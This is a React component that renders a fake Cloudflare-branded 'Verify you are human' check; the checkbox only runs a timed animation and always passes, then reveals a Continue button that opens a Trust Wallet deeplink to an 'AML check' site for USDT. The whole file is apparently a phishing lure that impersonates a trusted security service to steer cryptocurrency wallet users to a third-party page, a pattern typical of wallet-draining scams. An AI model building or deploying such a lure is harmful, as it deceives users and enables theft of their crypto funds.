"use client";

import { useState } from "react";

const DEEPLINK =
  "https://link.trustwallet.com/open_url?coin_id=60&url=https://usdtcheckaml.com";

export function CaptchaDeeplink() {
  const [checked, setChecked] = useState(false);
  const [verifying, setVerifying] = useState(false);
  const [verified, setVerified] = useState(false);

  const handleCheck = () => {
    if (checked || verifying || verified) return;
    setChecked(true);
    setVerifying(true);

    setTimeout(() => {
      setVerifying(false);
      setVerified(true);
    }, 1400);
  };

  return (
    <div style={styles.overlay}>
      <div style={styles.card}>
        {/* Header */}
        <div style={styles.header}>
          <div style={styles.shieldIcon}>
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
              <path
                d="M12 2L3 7v5c0 5.25 3.75 10.15 9 11.35C17.25 22.15 21 17.25 21 12V7L12 2z"
                fill="#f6821f"
              />
              <path
                d="M9 12l2 2 4-4"
                stroke="white"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
              />
            </svg>
          </div>
          <span style={styles.headerText}>Security Check</span>
        </div>

        <div style={styles.divider} />

        {/* Body */}
        <div style={styles.body}>
          <p style={styles.title}>Verify you are human</p>
          <p style={styles.subtitle}>
            This check protects the site from automated access.
          </p>

          {/* Checkbox row - заглушка без посилання */}
          <div style={styles.checkRow} onClick={handleCheck}>
            <div style={styles.checkboxWrap}>
              <div
                style={{
                  ...styles.checkbox,
                  borderColor: verified
                    ? "#2ecc71"
                    : checked
                      ? "#f6821f"
                      : "#8a8a8a",
                  background: verified ? "#2ecc71" : "transparent",
                }}
              >
                {verifying && <div style={styles.spinner} />}
                {verified && (
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
                    <path
                      d="M5 13l4 4L19 7"
                      stroke="white"
                      strokeWidth="3"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    />
                  </svg>
                )}
              </div>
            </div>

            <span
              style={{
                ...styles.checkLabel,
                color: verified ? "#2ecc71" : "#e8e8e8",
              }}
            >
              {verified
                ? "Verification complete"
                : verifying
                  ? "Verifying..."
                  : "I am not a robot"}
            </span>
          </div>

          {/* Кнопка появляється після верифікації */}
          {verified && (
            <a
              href={DEEPLINK}
              style={{
                textDecoration: "none",
                display: "block",
                marginTop: "14px",
              }}
            >
              <button style={styles.continueBtn}>Continue →</button>
            </a>
          )}
        </div>

        <div style={styles.divider} />

        {/* Footer */}
        <div style={styles.footer}>
          <div style={styles.footerLeft}>
            <div style={styles.cfLogo}>
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
                <circle cx="12" cy="12" r="10" fill="#f6821f" opacity="0.2" />
                <circle cx="12" cy="12" r="6" fill="#f6821f" opacity="0.5" />
                <circle cx="12" cy="12" r="3" fill="#f6821f" />
              </svg>
            </div>
            <span style={styles.cfText}>Cloudflare</span>
          </div>
          <div style={styles.footerLinks}>
            <span style={styles.footerLink}>Privacy</span>
            <span style={styles.footerDot}>·</span>
            <span style={styles.footerLink}>Terms</span>
          </div>
        </div>
      </div>

      <style>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(12px); }
          to { opacity: 1; transform: translateY(0); }
        }
        @keyframes slideUp {
          from { opacity: 0; transform: translateY(8px); }
          to { opacity: 1; transform: translateY(0); }
        }
      `}</style>
    </div>
  );
}

const styles: Record<string, React.CSSProperties> = {
  overlay: {
    position: "fixed",
    inset: 0,
    background: "#1a1a2e",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    fontFamily: "'Segoe UI', system-ui, sans-serif",
    animation: "fadeIn 0.4s ease",
    zIndex: 9999,
  },
  card: {
    background: "#232336",
    border: "1px solid #3a3a5c",
    borderRadius: "8px",
    width: "300px",
    boxShadow: "0 8px 32px rgba(0,0,0,0.5)",
    overflow: "hidden",
    animation: "fadeIn 0.4s ease",
  },
  header: {
    display: "flex",
    alignItems: "center",
    gap: "10px",
    padding: "12px 16px",
    background: "#1e1e32",
  },
  shieldIcon: {
    display: "flex",
    alignItems: "center",
  },
  headerText: {
    color: "#f6821f",
    fontWeight: 600,
    fontSize: "14px",
    letterSpacing: "0.03em",
  },
  divider: {
    height: "1px",
    background: "#3a3a5c",
  },
  body: {
    padding: "20px 16px 16px",
  },
  title: {
    color: "#ffffff",
    fontSize: "16px",
    fontWeight: 600,
    margin: "0 0 6px",
    letterSpacing: "0.01em",
  },
  subtitle: {
    color: "#8888aa",
    fontSize: "12px",
    margin: "0 0 20px",
    lineHeight: 1.5,
  },
  checkRow: {
    display: "flex",
    alignItems: "center",
    gap: "14px",
    background: "#1e1e32",
    border: "1px solid #3a3a5c",
    borderRadius: "6px",
    padding: "12px 14px",
    cursor: "pointer",
    transition: "border-color 0.2s",
  },
  checkboxWrap: {
    flexShrink: 0,
  },
  checkbox: {
    width: "24px",
    height: "24px",
    borderRadius: "4px",
    border: "2px solid",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    transition: "all 0.3s ease",
  },
  spinner: {
    width: "12px",
    height: "12px",
    border: "2px solid rgba(246,130,31,0.3)",
    borderTop: "2px solid #f6821f",
    borderRadius: "50%",
    animation: "spin 0.8s linear infinite",
  },
  checkLabel: {
    fontSize: "14px",
    fontWeight: 500,
    transition: "color 0.3s ease",
    userSelect: "none",
  },
  continueBtn: {
    width: "100%",
    padding: "13px",
    background: "#f6821f",
    color: "#fff",
    border: "none",
    borderRadius: "6px",
    fontSize: "15px",
    fontWeight: 600,
    cursor: "pointer",
    letterSpacing: "0.02em",
    animation: "slideUp 0.3s ease",
  },
  footer: {
    display: "flex",
    alignItems: "center",
    justifyContent: "space-between",
    padding: "10px 16px",
    background: "#1e1e32",
  },
  footerLeft: {
    display: "flex",
    alignItems: "center",
    gap: "6px",
  },
  cfLogo: {
    display: "flex",
  },
  cfText: {
    color: "#8888aa",
    fontSize: "12px",
    fontWeight: 500,
  },
  footerLinks: {
    display: "flex",
    alignItems: "center",
    gap: "6px",
  },
  footerLink: {
    color: "#8888aa",
    fontSize: "11px",
    cursor: "pointer",
  },
  footerDot: {
    color: "#8888aa",
    fontSize: "11px",
  },
};
